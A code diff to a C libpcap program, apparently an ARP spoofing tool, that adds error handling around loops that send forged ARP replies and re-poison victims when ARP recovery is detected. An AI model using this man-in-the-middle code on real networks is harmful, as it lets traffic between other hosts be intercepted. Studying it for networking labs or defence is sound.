@@ -136,8 +136,10 @@ void *SEND_ARP(void *info)
 
 	while (1)
 	{
-		pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2sender, sizeof(my_etharp_hdr)); puts("[  PROD  ] sender <- attacker    target");
-		pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2target, sizeof(my_etharp_hdr)); puts("[  PROD  ] sender    attacker -> target");
+		if (pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2sender, sizeof(my_etharp_hdr))) { pcap_perror(handle, "pcap_sendpacket error"); }
+		else { puts("[  PROD  ] sender <- attacker    target"); }
+		if (pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2target, sizeof(my_etharp_hdr))) { pcap_perror(handle, "pcap_sendpacket error"); }
+		else { puts("[  PROD  ] sender    attacker -> target"); }
 
 		sleep(10);
 	}
@@ -178,13 +180,15 @@ void *BLOCK_RECOVERY(void *info)
 		
 		if ((PCKT_ARPSPA == ((my_args_struct *)info)->sender_IP_int) && (PCKT_ARPTPA == ((my_args_struct *)info)->target_IP_int))
 		{
-			pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2sender, sizeof(my_etharp_hdr)); puts("[  RINF  ] sender <- attacker    target");
+			if (pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2sender, sizeof(my_etharp_hdr))) { pcap_perror(handle, "pcap_sendpacket error"); }
+			else { puts("[  RINF  ] sender <- attacker    target"); }
 			continue;
 		}
 
 		if ((PCKT_ARPSPA == ((my_args_struct *)info)->target_IP_int) && (PCKT_ARPTPA == ((my_args_struct *)info)->sender_IP_int))
 		{
-			pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2target, sizeof(my_etharp_hdr)); puts("[  RINF  ] sender    attacker -> target");
+			if (pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2target, sizeof(my_etharp_hdr))) { pcap_perror(handle, "pcap_sendpacket error"); }
+			else { puts("[  RINF  ] sender    attacker -> target"); }
 			continue;
 		}
 	}
@@ -193,4 +197,3 @@ void *BLOCK_RECOVERY(void *info)
 
 	return NULL;
 }
-
